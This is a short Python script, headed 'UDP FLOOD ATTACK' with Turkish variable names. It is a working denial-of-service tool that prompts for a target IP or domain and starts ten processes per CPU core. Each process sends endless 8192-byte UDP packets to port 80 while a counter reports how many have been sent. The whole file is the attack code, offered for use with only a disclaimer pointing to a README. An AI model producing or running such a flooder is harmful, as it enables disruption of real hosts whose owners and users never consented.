# UDP FLOOD ATTACK
# mirac-s
# WARNING: IF YOU USE THIS CODE You are deemed to have accepted README.md     

import socket
import multiprocessing
import os
import time
import signal

hedef_ip = input("TARGET IP OR DOMAIN: ")
hedef_port = 80   # PORT
veri_boyutu = 8192   # PACKAGE SIZE (B)
process_sayisi = os.cpu_count() * 10 

paket_sayaci = multiprocessing.Value('i', 0)

def flood(paket_sayaci):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1048576) 
    udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576) 
    
    veri = b'A' * veri_boyutu
    hedef = (hedef_ip, hedef_port)

    while True:
        try:
            udp_socket.sendto(veri, hedef)
            with paket_sayaci.get_lock():
                paket_sayaci.value += 1
        except (socket.error, KeyboardInterrupt):
            print("\033[31mCONNECTION DISCONNECTED!") 
            break

if __name__ == '__main__':
    print(f"\033[32mPLEASE WAIT...")
    processler = []
    
    for _ in range(process_sayisi):
        p = multiprocessing.Process(target=flood, args=(paket_sayaci,))
        p.daemon = True
        p.start()
        processler.append(p)

    try:
        while True:
            with paket_sayaci.get_lock():
                print(f"TOTAL PACKAGE: {paket_sayaci.value}")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nPROCESS STOPPED!")
        for p in processler:
            os.kill(p.pid, signal.SIGTERM)
            p.join()
        print("\033[31mCONNECTION DISCONNECTED!")
        print(f"\033[32mTOTAL SENT: {paket_sayaci.value}")